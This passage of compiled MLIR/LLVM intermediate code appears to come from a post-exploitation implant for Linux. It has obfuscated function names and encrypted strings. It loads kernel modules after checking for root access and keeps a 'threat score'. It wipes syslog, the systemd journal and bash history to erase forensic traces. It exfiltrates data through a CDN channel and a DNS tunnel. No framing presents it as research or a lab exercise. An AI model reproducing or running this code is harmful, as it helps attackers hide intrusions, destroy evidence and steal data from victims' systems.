    %95 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    %96 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %97 = llvm.call @array_len(%96) : (!llvm.ptr) -> i64
    %98 = llvm.call @string(%97) : (i64) -> !llvm.ptr
    %99 = llvm.call @jocky_str_concat(%95, %98) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %100 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %101 = llvm.call @jocky_str_concat(%99, %100) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%101) : (!llvm.ptr) -> ()
    llvm.br ^bb9
  ^bb9:  // 2 preds: ^bb7, ^bb8
    llvm.return
  }
  llvm.func @f_97a724e0() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.43.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.44.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @g_eb7aa1a1 : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %6 = llvm.mlir.constant(0 : i64) : i64
    %7 = llvm.mlir.addressof @g_b7bfea9b : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.54.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.55.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.45.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.50.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.51.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.52.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.53.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.46.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.47.enc" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.48.enc" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.49.enc" : !llvm.ptr
    %23 = llvm.mlir.constant(1 : i64) : i64
    %24 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %25 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %26 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %27 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    %29 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %30 = llvm.call @array_len(%29) : (!llvm.ptr) -> i64
    %31 = llvm.call @string(%30) : (i64) -> !llvm.ptr
    %32 = llvm.call @jocky_str_concat(%28, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%32) : (!llvm.ptr) -> ()
    %33 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %34 {alignment = 4 : i64} : i32, !llvm.ptr
    %35 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %36 = llvm.call @array_len(%35) : (!llvm.ptr) -> i64
    %37 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %6, %37 {alignment = 4 : i64} : i64, !llvm.ptr
    %38 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb6
    %39 = llvm.load %37 {alignment = 4 : i64} : !llvm.ptr -> i64
    %40 = llvm.icmp "slt" %39, %36 : i64
    llvm.cond_br %40, ^bb2, ^bb7
  ^bb2:  // pred: ^bb1
    %41 = llvm.bitcast %35 : !llvm.ptr to !llvm.ptr
    %42 = llvm.getelementptr %41[%39] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %43 = llvm.load %42 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %43, %38 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %44 = llvm.load %38 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.bitcast %44 : !llvm.ptr to !llvm.ptr
    %46 = llvm.getelementptr %45[%2] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %47 = llvm.load %46 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %47, %24 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %48 = llvm.load %38 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %49 = llvm.bitcast %48 : !llvm.ptr to !llvm.ptr
    %50 = llvm.getelementptr %49[%0] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %51 = llvm.load %50 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %51, %25 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %52 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    %53 = llvm.load %34 {alignment = 4 : i64} : !llvm.ptr -> i32
    %54 = llvm.add %53, %0 : i32
    %55 = llvm.sext %54 : i32 to i64
    %56 = llvm.call @string(%55) : (i64) -> !llvm.ptr
    %57 = llvm.call @jocky_str_concat(%52, %56) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %58 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %59 = llvm.call @jocky_str_concat(%57, %58) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %60 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %61 = llvm.call @array_len(%60) : (!llvm.ptr) -> i64
    %62 = llvm.call @string(%61) : (i64) -> !llvm.ptr
    %63 = llvm.call @jocky_str_concat(%59, %62) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %64 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<3 x i8>
    %65 = llvm.call @jocky_str_concat(%63, %64) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %66 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %67 = llvm.call @jocky_str_concat(%65, %66) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%67) : (!llvm.ptr) -> ()
    %68 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %69 = llvm.load %25 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %70 = llvm.call @jocky_str_concat(%68, %69) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%70) : (!llvm.ptr) -> ()
    %71 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %72 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %73 = llvm.call @jocky_str_concat(%71, %72) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %74 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %75 = llvm.call @jocky_lkm_load(%73, %74) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %75, %26 {alignment = 4 : i64} : i32, !llvm.ptr
    %76 = llvm.load %26 {alignment = 4 : i64} : !llvm.ptr -> i32
    %77 = llvm.icmp "eq" %76, %2 : i32
    llvm.cond_br %77, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %78 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%78) : (!llvm.ptr) -> ()
    %79 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %81 = llvm.call @array_append(%79, %80) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %81, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %82 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %83 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %84 = llvm.getelementptr %21[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %85 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    llvm.call @f_0218a827(%82, %83, %84, %85) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb4:  // pred: ^bb2
    %86 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%86) : (!llvm.ptr) -> ()
    %87 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %88 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %89 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %90 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%87, %88, %89, %90) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // 2 preds: ^bb3, ^bb4
    %91 = llvm.load %34 {alignment = 4 : i64} : !llvm.ptr -> i32
    %92 = llvm.add %91, %0 : i32
    llvm.store %92, %34 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb6
  ^bb6:  // pred: ^bb5
    %93 = llvm.add %39, %23 : i64
    llvm.store %93, %37 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb7:  // pred: ^bb1
    %94 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %95 = llvm.call @array_len(%94) : (!llvm.ptr) -> i64
    %96 = llvm.sext %2 : i32 to i64
    %97 = llvm.icmp "sgt" %95, %96 : i64
    llvm.cond_br %97, ^bb8, ^bb9
  ^bb8:  // pred: ^bb7
    %98 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%98) : (!llvm.ptr) -> ()
    %99 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    %100 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %101 = llvm.call @array_len(%100) : (!llvm.ptr) -> i64
    %102 = llvm.call @string(%101) : (i64) -> !llvm.ptr
    %103 = llvm.call @jocky_str_concat(%99, %102) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %104 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %105 = llvm.call @jocky_str_concat(%103, %104) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%105) : (!llvm.ptr) -> ()
    llvm.br ^bb9
  ^bb9:  // 2 preds: ^bb7, ^bb8
    llvm.return
  }
  llvm.func @f_c1c92895() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.56.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(0.000000e+00 : f64) : f64
    %4 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %5 = llvm.mlir.addressof @root_access_obtained : !llvm.ptr
    %6 = llvm.mlir.constant(5.000000e-01 : f64) : f64
    %7 = llvm.mlir.addressof @".str.57.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @g_b7bfea9b : !llvm.ptr
    %9 = llvm.mlir.constant(2.000000e-01 : f64) : f64
    %10 = llvm.mlir.addressof @".str.58.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @g_e836b4e8 : !llvm.ptr
    %12 = llvm.mlir.constant(1.500000e-01 : f64) : f64
    %13 = llvm.mlir.addressof @".str.59.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.60.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.61.enc" : !llvm.ptr
    %17 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    llvm.store %3, %4 {alignment = 8 : i64} : f64, !llvm.ptr
    %20 = llvm.load %5 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %20, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %21 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> f64
    %22 = llvm.fadd %21, %6 : f64
    llvm.store %22, %4 {alignment = 8 : i64} : f64, !llvm.ptr
    %23 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %24 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %25 = llvm.call @array_len(%24) : (!llvm.ptr) -> i64
    llvm.store %25, %17 {alignment = 4 : i64} : i64, !llvm.ptr
    %26 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> f64
    %27 = llvm.fadd %26, %9 : f64
    llvm.store %27, %4 {alignment = 8 : i64} : f64, !llvm.ptr
    %28 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%28) : (!llvm.ptr) -> ()
    %29 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %30 = llvm.call @array_len(%29) : (!llvm.ptr) -> i64
    llvm.store %30, %18 {alignment = 4 : i64} : i64, !llvm.ptr
    %31 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> f64
    %32 = llvm.fadd %31, %12 : f64
    llvm.store %32, %4 {alignment = 8 : i64} : f64, !llvm.ptr
    %33 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> f64
    %35 = llvm.fadd %34, %12 : f64
    llvm.store %35, %4 {alignment = 8 : i64} : f64, !llvm.ptr
    %36 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
    llvm.call @println(%36) : (!llvm.ptr) -> ()
    %37 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    %38 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    %39 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> f64
    %40 = llvm.fptosi %39 : f64 to i64
    %41 = llvm.call @string(%40) : (i64) -> !llvm.ptr
    %42 = llvm.call @jocky_str_concat(%38, %41) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%42) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_fe69c41f() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.62.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.63.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.64.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.65.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.66.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.67.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.68.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.69.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.70.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.71.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.72.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.73.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.74.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.75.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.76.enc" : !llvm.ptr
    %18 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %20 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.call @jocky_linux_cleanup_syslog() : () -> i32
    llvm.store %22, %18 {alignment = 4 : i64} : i32, !llvm.ptr
    %23 = llvm.load %18 {alignment = 4 : i64} : !llvm.ptr -> i32
    %24 = llvm.icmp "eq" %23, %2 : i32
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %27 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %28 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %29 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @f_0218a827(%26, %27, %28, %29) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %30 = llvm.call @jocky_linux_cleanup_journal() : () -> i32
    llvm.store %30, %19 {alignment = 4 : i64} : i32, !llvm.ptr
    %31 = llvm.load %19 {alignment = 4 : i64} : !llvm.ptr -> i32
    %32 = llvm.icmp "eq" %31, %2 : i32
    llvm.cond_br %32, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %33 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %35 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %36 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %37 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @f_0218a827(%34, %35, %36, %37) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %38 = llvm.call @linux_forensics_wipe_bash_history() : () -> i32
    llvm.store %38, %20 {alignment = 4 : i64} : i32, !llvm.ptr
    %39 = llvm.load %20 {alignment = 4 : i64} : !llvm.ptr -> i32
    %40 = llvm.icmp "eq" %39, %2 : i32
    llvm.cond_br %40, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %41 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    %42 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %43 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %44 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %45 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @f_0218a827(%42, %43, %44, %45) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %46 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<51 x i8>
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<56 x i8>
    llvm.call @println(%47) : (!llvm.ptr) -> ()
    %48 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%48) : (!llvm.ptr) -> ()
    %49 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_53decde1() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.77.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.78.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.79.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.80.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.81.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.82.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.83.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.84.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.85.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.86.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.87.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.88.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.89.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.90.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.91.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.92.enc" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.93.enc" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.94.enc" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.95.enc" : !llvm.ptr
    %24 = llvm.mlir.addressof @g_b7bfea9b : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.96.enc" : !llvm.ptr
    %26 = llvm.mlir.addressof @".str.97.enc" : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.98.enc" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.99.enc" : !llvm.ptr
    %29 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %30 = llvm.mlir.addressof @".str.100.enc" : !llvm.ptr
    %31 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %35 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    %36 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%36) : (!llvm.ptr) -> ()
    %37 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %38 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %39 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    %40 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %41 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> f64
    %42 = llvm.fptosi %41 : f64 to i64
    %43 = llvm.call @string(%42) : (i64) -> !llvm.ptr
    %44 = llvm.call @jocky_str_concat(%40, %43) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %45 = llvm.call @exfil_local_cdn(%37, %38, %39, %44) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
    llvm.store %45, %31 {alignment = 4 : i64} : i32, !llvm.ptr
    %46 = llvm.load %31 {alignment = 4 : i64} : !llvm.ptr -> i32
    %47 = llvm.icmp "eq" %46, %2 : i32
    llvm.cond_br %47, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %48 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
    llvm.call @println(%48) : (!llvm.ptr) -> ()
    %49 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %50 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %51 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %52 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    llvm.call @f_0218a827(%49, %50, %51, %52) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %53 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    %54 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %55 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %56 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %57 = llvm.sext %56 : i32 to i64
    %58 = llvm.call @string(%57) : (i64) -> !llvm.ptr
    %59 = llvm.call @jocky_str_concat(%55, %58) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %60 = llvm.call @exfil_dns_tunnel(%54, %59) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %60, %32 {alignment = 4 : i64} : i32, !llvm.ptr
    %61 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %62 = llvm.icmp "eq" %61, %2 : i32
    llvm.cond_br %62, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %63 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    %64 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
